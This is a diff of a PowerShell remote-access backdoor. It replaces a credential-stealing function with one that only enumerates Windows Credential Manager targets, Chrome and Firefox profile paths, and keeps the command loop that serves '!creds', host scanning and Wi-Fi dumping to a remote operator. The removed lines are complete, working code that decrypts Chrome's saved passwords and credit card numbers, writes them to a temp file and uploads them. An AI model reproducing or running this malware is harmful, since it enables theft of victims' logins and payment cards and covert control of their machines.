@@ -387,125 +387,38 @@ function PortSuggest {
         return "[DOWNLOADED] $out"
     }
 
-    function Get-CredentialsFull {
+    function Get-Credentials {
     try {
         $output = ""
-        $ErrorActionPreference = 'Stop'
 
-        # --- Добавим функцию для расшифровки AES-GCM Chrome (Windows 10+)
-        function Decrypt-ChromePassword {
-            param (
-                [byte[]]$Encrypted,
-                [byte[]]$Key
-            )
-            $iv = $Encrypted[3..14]
-            $ciphertext = $Encrypted[15..($Encrypted.Length - 17)]
-            $tag = $Encrypted[($Encrypted.Length - 16)..($Encrypted.Length - 1)]
-
-            $aes = [System.Security.Cryptography.AesGcm]::new($Key)
-            $plaintext = New-Object byte[] $ciphertext.Length
-            $aes.Decrypt($iv, $ciphertext, $tag, $plaintext)
-            return [System.Text.Encoding]::UTF8.GetString($plaintext)
-        }
-
-        # --- Извлекаем Windows креды (мета-данные)
+        # 1. Windows Credential Manager (generic credentials)
         $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
             $target = $_.ToString().Split(":")[1].Trim()
-            "[WIN_CRED] $target"
-        }
-        $output += ($creds -join "`n") + "`n"
-
-        # --- Chrome путь и проверка
-        $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        $chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-
-        if (!(Test-Path $chromeLoginData) -or !(Test-Path $chromeLocalState)) {
-            return "[INFO] Chrome not found or user has no saved credentials."
+            $output += "`n[TARGET] $target"
         }
 
-        # --- Извлекаем и расшифровываем AES-ключ
-        $localState = Get-Content $chromeLocalState -Raw | ConvertFrom-Json
-        $encKeyB64 = $localState.os_crypt.encrypted_key
-        $encKey = [System.Convert]::FromBase64String($encKeyB64)
-        $encKey = $encKey[5..($encKey.Length - 1)]
-        $key = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-
-        # --- Копируем базу во временный файл (SQLite lock)
-        $tmpLogin = "$env:TEMP\login_tmp.db"
-        Copy-Item -Path $chromeLoginData -Destination $tmpLogin -Force
-
-        # --- Загружаем SQLite и вытаскиваем логины
-        $conn = New-Object -ComObject ADODB.Connection
-        $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tmpLogin;Mode=Read")
-    } catch {
-        try {
-            # fallback для PowerShell 7 — через System.Data.SQLite (если установлен)
-            Add-Type -AssemblyName System.Data.SQLite
-            $conn = New-Object System.Data.SQLite.SQLiteConnection
-            $conn.ConnectionString = "Data Source=$tmpLogin"
-            $conn.Open()
-        } catch {
-            return "[ERROR] Failed to read Chrome Login Data: $($_.Exception.Message)"
+        # 2. Chrome saved logins (мета-данные — без дешифровки)
+        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromeLoginPath) {
+            $output += "`n[+] Chrome login database found: $chromeLoginPath"
         }
-    }
 
-    try {
-        $cmd = $conn.CreateCommand()
-        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-        $reader = $cmd.ExecuteReader()
-        while ($reader.Read()) {
-            $url = $reader.GetString(0)
-            $username = $reader.GetString(1)
-            $passwordBytes = $reader.GetValue(2)
-            $password = ""
-            if ($passwordBytes[0..2] -join '' -eq 'v10') {
-                $password = Decrypt-ChromePassword -Encrypted $passwordBytes -Key $key
-            } else {
-                $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($passwordBytes, $null, 'CurrentUser'))
-            }
-            $output += "[CHROME] $url | $username | $password`n"
+        # 3. Firefox профили (только список профилей)
+        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
+        foreach ($profile in $firefoxProfiles) {
+            $output += "`n[+] Firefox profile: $($profile.FullName)"
         }
-        $reader.Close()
-        $conn.Close()
-    } catch {
-        $output += "[ERROR] Failed to extract Chrome logins: $($_.Exception.Message)`n"
-    }
 
-    # --- Извлекаем сохранённые карты Chrome (если есть)
-    try {
-        $cmd = $conn.CreateCommand()
-        $cmd.CommandText = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
-        $reader = $cmd.ExecuteReader()
-        while ($reader.Read()) {
-            $name = $reader.GetString(0)
-            $mm = $reader.GetInt32(1)
-            $yy = $reader.GetInt32(2)
-            $cardEnc = $reader.GetValue(3)
-            $cardNum = ""
-            if ($cardEnc[0..2] -join '' -eq 'v10') {
-                $cardNum = Decrypt-ChromePassword -Encrypted $cardEnc -Key $key
-            } else {
-                $cardNum = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($cardEnc, $null, 'CurrentUser'))
-            }
-            $output += "[CARD] $name | $cardNum | $mm/$yy`n"
+        if ([string]::IsNullOrWhiteSpace($output)) {
+            return "[INFO] No credentials found or access denied."
         }
-        $reader.Close()
-        $conn.Close()
-    } catch {
-        $output += "[INFO] No saved cards or failed to extract.`n"
-    }
 
-    # --- Сохраняем как временный txt
-    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like "192.168.*" })[0].IPAddress
-    $finalFile = "$env:TEMP\creds_$ip.txt"
-    Set-Content -Path $finalFile -Value $output -Encoding UTF8
-    return Upload-File $finalFile
+        return $output
     }
     catch {
-        return "[ERROR] Get-CredentialsFull failed: $($_.Exception.Message)"
+        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
-
     
     function Dump-WiFi {
     netsh wlan show profiles | ForEach-Object {
@@ -782,13 +695,8 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        try {
-                            $response = Get-CredentialsFull
-                        } catch {
-                            $response = "[ERROR] Get-CredentialsFull failed: $($_.Exception.Message)"
-                        }
+                        $response = Get-Credentials
                     }
-
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
                         $response = ""
@@ -891,6 +799,6 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
             Start-Sleep -Seconds 5
         }
     }
-
+}
 
 Connect-ZiPo
